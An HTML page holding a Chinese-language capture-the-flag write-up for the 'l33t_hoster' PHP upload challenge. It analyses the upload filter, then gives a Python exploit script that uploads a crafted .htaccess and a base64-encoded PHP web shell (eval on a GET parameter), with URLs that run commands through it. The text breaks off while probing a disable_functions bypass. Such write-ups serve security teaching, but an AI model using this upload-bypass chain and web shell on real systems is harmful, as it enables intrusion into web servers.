@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-Hans">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="环境搭建官方源码发布(包含docker) 线上环境(目前还能访问) 源码分析查看html注释发现http://35.246.234.136/?source 获得源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/2020/04/18/l33t writeup/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="环境搭建官方源码发布(包含docker) 线上环境(目前还能访问) 源码分析查看html注释发现http://35.246.234.136/?source 获得源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/Users/waderwu/notebook/img/image-20190122132240238.png">
+<meta property="og:image" content="http://yoursite.com/Users/waderwu/notebook/img/image-20190122135851917.png">
+<meta property="og:image" content="http://yoursite.com/Users/waderwu/notebook/img/image-20190122140106678.png">
+<meta property="og:image" content="http://yoursite.com/Users/waderwu/notebook/img/image-20190122161403251.png">
+<meta property="og:image" content="http://yoursite.com/Users/waderwu/notebook/img/image-20190122172902856.png">
+<meta property="og:image" content="http://yoursite.com/Users/waderwu/notebook/img/image-20190122173135836.png">
+<meta property="og:image" content="http://yoursite.com/Users/waderwu/notebook/img/image-20190122202414731.png">
+<meta property="og:updated_time" content="2020-04-17T16:29:07.184Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+<meta name="twitter:description" content="环境搭建官方源码发布(包含docker) 线上环境(目前还能访问) 源码分析查看html注释发现http://35.246.234.136/?source 获得源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263">
+<meta name="twitter:image" content="http://yoursite.com/Users/waderwu/notebook/img/image-20190122132240238.png">
+  <link rel="canonical" href="http://yoursite.com/2020/04/18/l33t writeup/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title> | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+  </ul>
+
+    
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/18/l33t writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wuyx">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2020-04-18 00:22:10 / Modified: 00:29:07" itemprop="dateCreated datePublished" datetime="2020-04-18T00:22:10+08:00">2020-04-18</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://github.com/eboda/insomnihack/tree/master/l33t_hoster" target="_blank" rel="noopener">官方源码发布</a>(包含docker)</p>
+<p><a href="http://35.246.234.136" target="_blank" rel="noopener">线上环境</a>(目前还能访问)</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>查看html注释发现<a href="http://35.246.234.136/?source" target="_blank" rel="noopener">http://35.246.234.136/?source</a></p>
+<p>获得源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">"source"</span>])) </span><br><span class="line">    <span class="keyword">die</span>(highlight_file(<span class="keyword">__FILE__</span>));</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">"home"</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">"home"</span>] = bin2hex(random_bytes(<span class="number">20</span>));</span><br><span class="line">&#125;</span><br><span class="line">$userdir = <span class="string">"images/&#123;$_SESSION["</span>home<span class="string">"]&#125;/"</span>;</span><br><span class="line"><span class="keyword">if</span> (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$disallowed_ext = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"php"</span>,</span><br><span class="line">    <span class="string">"php3"</span>,</span><br><span class="line">    <span class="string">"php4"</span>,</span><br><span class="line">    <span class="string">"php5"</span>,</span><br><span class="line">    <span class="string">"php7"</span>,</span><br><span class="line">    <span class="string">"pht"</span>,</span><br><span class="line">    <span class="string">"phtm"</span>,</span><br><span class="line">    <span class="string">"phtml"</span>,</span><br><span class="line">    <span class="string">"phar"</span>,</span><br><span class="line">    <span class="string">"phps"</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"upload"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">'image'</span>][<span class="string">'error'</span>] !== UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"yuuuge fail"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $tmp_name = $_FILES[<span class="string">"image"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line">    $name = $_FILES[<span class="string">"image"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $parts = explode(<span class="string">"."</span>, $name);</span><br><span class="line">    $ext = array_pop($parts);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="number">0</span>])) &#123;</span><br><span class="line">        array_shift($parts);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count($parts) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"lol filename is empty"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_array($ext, $disallowed_ext, <span class="keyword">TRUE</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"lol nice try, but im not stupid dude..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $image = file_get_contents($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> (mb_strpos($image, <span class="string">"&lt;?"</span>) !== <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"why would you need php in a pic....."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!exif_imagetype($tmp_name)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"not an image."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $image_size = getimagesize($tmp_name);</span><br><span class="line">    <span class="keyword">if</span> ($image_size[<span class="number">0</span>] !== <span class="number">1337</span> || $image_size[<span class="number">1</span>] !== <span class="number">1337</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"lol noob, your pic is not l33t enough"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $name = implode(<span class="string">"."</span>, $parts);</span><br><span class="line">    move_uploaded_file($tmp_name, $userdir . $name . <span class="string">"."</span> . $ext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;"</span>;</span><br><span class="line"><span class="keyword">foreach</span>(glob($userdir . <span class="string">"*"</span>) <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;li&gt;&lt;a href='$file'&gt;$file&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/ul&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Upload your pics!&lt;/h1&gt;</span><br><span class="line">&lt;form method=<span class="string">"POST"</span> action=<span class="string">"?"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"image"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=upload&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;!-- /?source --&gt;</span><br></pre></td></tr></table></figure>
+
+<p>先解释几个php函数</p>
+<ul>
+<li><p><code>array_pop</code> :<code>array_pop — Pop the element off the end of array</code></p>
+</li>
+<li><p><code>explode</code>:<code>explode — Split a string by a string</code></p>
+</li>
+<li><p><code>array_shift</code>:<code>array_shift — Shift an element off the beginning of array</code></p>
+</li>
+<li><p><code>exif_imagetype</code>:<code>exif_imagetype — Determine the type of an image</code></p>
+</li>
+<li><p><code>getimagesize</code>:<code>getimagesize — Get the size of an image</code></p>
+</li>
+<li><p><code>implode</code>:<code>implode — Join array elements with a string</code></p>
+</li>
+<li><p><code>mb_strpos</code>:<code>mb_strpos — Find position of first occurrence of string in a string</code></p>
+</li>
+</ul>
+<p>通过读源码，攻击者可以上传文件。上传的文件有很多限制。</p>
+<ul>
+<li><p>文件名必须要包含<code>.</code></p>
+</li>
+<li><p>设置了文件后缀黑名单<code>&quot;php&quot;,&quot;php3&quot;,&quot;php4&quot;,&quot;php5&quot;,&quot;php7&quot;,&quot;pht&quot;,&quot;phtm&quot;,&quot;phtml&quot;,&quot;phar&quot;,&quot;phps&quot;</code>,黑名单非常完善。</p>
+<ul>
+<li>如果文件名是通过get或post获取的，可采用<code>php\n</code>的方式绕过</li>
+<li>如果存在<code>.htaccess</code>可以通过上传<code>.htaccess</code>达到其他后缀的效果</li>
+<li>如果获取文件后缀的方式有问题，可以通过<code>php/.</code> 方式绕过</li>
+</ul>
+</li>
+<li><p>文件内容不能包含<code>&lt;?</code></p>
+<ul>
+<li><p>通过php小于7.0的可以通过<code>&lt;script lanague=&#39;php&#39;&gt;</code> 绕过</p>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">7.0.0	The ASP tags &lt;%, %&gt;, &lt;%=, and the script tag &lt;script language=&quot;php&quot;&gt; are removed from PHP.</span><br><span class="line">5.4.0	The tag &lt;?= is always available regardless of the short_open_tag ini setting.</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>如果能够控制文件名开头可以通过伪协议绕过：<code>php://filter</code> 等</p>
+</li>
+</ul>
+</li>
+<li><p>文件要通过<code>exif_imagetype</code>的检查</p>
+<ul>
+<li>只检查文件头</li>
+</ul>
+</li>
+<li><p>图片的height和width要是1337</p>
+</li>
+</ul>
+<h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>通过<code>php/.</code> 能够写文件吗？</p>
+<p><img src="/Users/waderwu/notebook/img/image-20190122132240238.png" alt="image-20190122132240238"></p>
+<p>从上面发现好像能够写文件，但是需要我们控制文件名为<code>xxx.php/.</code>  在上传文件的过程中我们只能够控制<code>filename</code> 但是测试发现当filename改为</p>
+<p><code>wushell.php/.</code> 的时候<code>$name = $_FILES[&quot;image&quot;][&quot;name&quot;]</code> 只能为<code>.</code>，后来又测试了一下通过<code>$_FILES</code>获取的文件名不能包含<code>/</code> ，他会取最后一个<code>/</code>后面的内容。所以想通过<code>xxx.php/.</code> 的思路行不通。</p>
+<h3 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h3><p>然后再试<code>.htaccess</code> </p>
+<p><img src="/Users/waderwu/notebook/img/image-20190122135851917.png" alt="image-20190122135851917"></p>
+<p>存在可能有戏。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$parts = explode(<span class="string">"."</span>, $name);</span><br><span class="line">    $ext = array_pop($parts);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($parts[<span class="number">0</span>])) &#123;</span><br><span class="line">        array_shift($parts);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count($parts) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"lol filename is empty"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是如果我们控制<code>filename</code>为<code>.htaccess</code> </p>
+<p><img src="/Users/waderwu/notebook/img/image-20190122140106678.png" alt="image-20190122140106678"></p>
+<p>这是<code>$parts</code>将为空，难道<code>.htaccess</code>也不行吗？有个地方比较奇怪</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (empty($parts[0])) &#123;</span><br><span class="line">        array_shift($parts);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样做可能会导致最后的filename与从<code>$name = $_FILES[&quot;image&quot;][&quot;name&quot;]</code> 不同。</p>
+<p>如果我们控制<code>filename</code>为<code>..htaccess</code> 不就行了吗？</p>
+<p>好的到目前为止，我们可以控制最后的文件名为<code>.htaccess</code> 了。</p>
+<p>如果能够控制<code>.htaccess</code>的内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .wuwu</span><br></pre></td></tr></table></figure>
+
+<p>即可。</p>
+<p>但是这样肯定是不能满足关于图片的哪些检查的。</p>
+<p>根据前面的分析，<code>.htaccess</code>需要满足</p>
+<ul>
+<li>exif_imagetype() 支持的magic number</li>
+<li><code>AddType application/x-httpd-php .wuwu</code></li>
+<li>还要能正确解析</li>
+</ul>
+<p>如果强行加magic number是不能被正确解析的,可以加注释<code>#</code>,但是没有magic number为<code>#</code>。感觉到这时候可以fuzz了</p>
+<p><a href="https://github.com/php/php-src/blob/e219ec144ef6682b71e135fd18654ee1bb4676b4/ext/standard/image.c" target="_blank" rel="noopener">https://github.com/php/php-src/blob/e219ec144ef6682b71e135fd18654ee1bb4676b4/ext/standard/image.c</a>  根据这进行fuzz</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI const char php_sig_gif[3] = &#123;&apos;G&apos;, &apos;I&apos;, &apos;F&apos;&#125;;</span><br><span class="line">PHPAPI const char php_sig_psd[4] = &#123;&apos;8&apos;, &apos;B&apos;, &apos;P&apos;, &apos;S&apos;&#125;;</span><br><span class="line">PHPAPI const char php_sig_bmp[2] = &#123;&apos;B&apos;, &apos;M&apos;&#125;;</span><br><span class="line">PHPAPI const char php_sig_swf[3] = &#123;&apos;F&apos;, &apos;W&apos;, &apos;S&apos;&#125;;</span><br><span class="line">PHPAPI const char php_sig_swc[3] = &#123;&apos;C&apos;, &apos;W&apos;, &apos;S&apos;&#125;;</span><br><span class="line">PHPAPI const char php_sig_jpg[3] = &#123;(char) 0xff, (char) 0xd8, (char) 0xff&#125;;</span><br><span class="line">PHPAPI const char php_sig_png[8] = &#123;(char) 0x89, (char) 0x50, (char) 0x4e, (char) 0x47,</span><br><span class="line">                                    (char) 0x0d, (char) 0x0a, (char) 0x1a, (char) 0x0a&#125;;</span><br><span class="line">PHPAPI const char php_sig_tif_ii[4] = &#123;&apos;I&apos;,&apos;I&apos;, (char)0x2A, (char)0x00&#125;;</span><br><span class="line">PHPAPI const char php_sig_tif_mm[4] = &#123;&apos;M&apos;,&apos;M&apos;, (char)0x00, (char)0x2A&#125;;</span><br><span class="line">PHPAPI const char php_sig_jpc[3]  = &#123;(char)0xff, (char)0x4f, (char)0xff&#125;;</span><br><span class="line">PHPAPI const char php_sig_jp2[12] = &#123;(char)0x00, (char)0x00, (char)0x00, (char)0x0c,</span><br><span class="line">                                     (char)0x6a, (char)0x50, (char)0x20, (char)0x20,</span><br><span class="line">                                     (char)0x0d, (char)0x0a, (char)0x87, (char)0x0a&#125;;</span><br><span class="line">PHPAPI const char php_sig_iff[4] = &#123;&apos;F&apos;,&apos;O&apos;,&apos;R&apos;,&apos;M&apos;&#125;;</span><br><span class="line">PHPAPI const char php_sig_ico[4] = &#123;(char)0x00, (char)0x00, (char)0x01, (char)0x00&#125;;</span><br><span class="line">PHPAPI const char php_sig_riff[4] = &#123;&apos;R&apos;, &apos;I&apos;, &apos;F&apos;, &apos;F&apos;&#125;;</span><br><span class="line">PHPAPI const char php_sig_webp[4] = &#123;&apos;W&apos;, &apos;E&apos;, &apos;B&apos;, &apos;P&apos;&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>测试发现0x00开头的能满足条件。</p>
+<p>所以jp2 和ico能够满足。</p>
+<p>ico的长度最多是0xff，为1337是0x539</p>
+<p>jp2 只修改header不能改变getimagesize的结果。到这里感觉有点凉凉。</p>
+<p>硬着头皮查<a href="http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants" target="_blank" rel="noopener">http://php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants</a></p>
+<p>剩下的magic number</p>
+<p>查到wbmp可以<a href="https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Wireless_Application_Protocol_Bitmap_Format</a></p>
+<p>然后用此链接<a href="https://image.online-convert.com/convert-to-wbmp生成一个1337*1337大小的图像，然后删除只留`00008A398A39`" target="_blank" rel="noopener">https://image.online-convert.com/convert-to-wbmp生成一个1337*1337大小的图像，然后删除只留`00008A398A39`</a> 这些即可满足type为wbmp长宽高为1337</p>
+<p><img src="/Users/waderwu/notebook/img/image-20190122161403251.png" alt="image-20190122161403251"></p>
+<p>到这里终于可以写<code>.htaccess</code>了</p>
+<p>但是虽然xxx.wuwu 能够当成php执行了，但是还是不能写<code>&lt;?</code>解决的方式还是使用伪协议。</p>
+<p><code>php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.wuwu&quot;</code>会自动include一个php脚本</p>
+<p>所以最后的htaccess</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .wuwu</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.wuwu&quot;</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://35.246.234.136/?"</span></span><br><span class="line"></span><br><span class="line">header = &#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=58eshi3a265dguf0icnkc6qk5a"</span>&#125;</span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .wuwu</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/images/e694a9e3c406b3d8b247d73836958f6303ed7b72/shell.wuwu"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">b"\x00\x00\x8a\x39\x8a\x39"</span>+<span class="string">b"00"</span>+ base64.b64encode(<span class="string">b"&lt;?php eval($_GET['c']);?&gt;"</span>)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'image'</span>,(<span class="string">'..htaccess'</span>,htaccess,<span class="string">'application/octet-stream'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;</span><br><span class="line">print(<span class="string">"upload .htaccess"</span>)</span><br><span class="line">r = requests.post(url=url, data=data, files=files,headers=header)<span class="comment">#proxies=proxies)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(r.text) </span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"upload shell.wuwu"</span>)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'image'</span>,(<span class="string">'shell.wuwu'</span>,shell,<span class="string">'application/octet-stream'</span>))]</span><br><span class="line">r = requests.post(url=url, data=data, files=files,headers=header)</span><br></pre></td></tr></table></figure>
+
+<p>查看phpinfo()</p>
+<p><img src="/Users/waderwu/notebook/img/image-20190122172902856.png" alt="image-20190122172902856"></p>
+<p><code>http://35.246.234.136/images/e694a9e3c406b3d8b247d73836958f6303ed7b72/shell.wuwu?c=var_dump(scandir(%27/%27));</code></p>
+<p><img src="/Users/waderwu/notebook/img/image-20190122173135836.png" alt="image-20190122173135836"></p>
+<p>发现flag和get_flag，先尝试读取flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://35.246.234.136/images/e694a9e3c406b3d8b247d73836958f6303ed7b72/shell.wuwu?c=highlight_file(%27/flag%27);</span><br></pre></td></tr></table></figure>
+
+<p>发现啥都没有，应该是没有权限读</p>
+<p>算了，还是先绕过disable fucntion吧</p>
+<p>想到了前段时间爆出来的<code>imap_open</code> 绕过disable function<a href="https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable-functions-in-php-installations-6ccdbf4f52bb" target="_blank" rel="noopener">https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable-functions-in-php-installations-6ccdbf4f52bb</a></p>
+<p><a href="https://github.com/Bo0oM/PHP_imap_open_exploit" target="_blank" rel="noopener">https://github.com/Bo0oM/PHP_imap_open_exploit</a></p>
+<p>判断imap_open 是否存在</p>
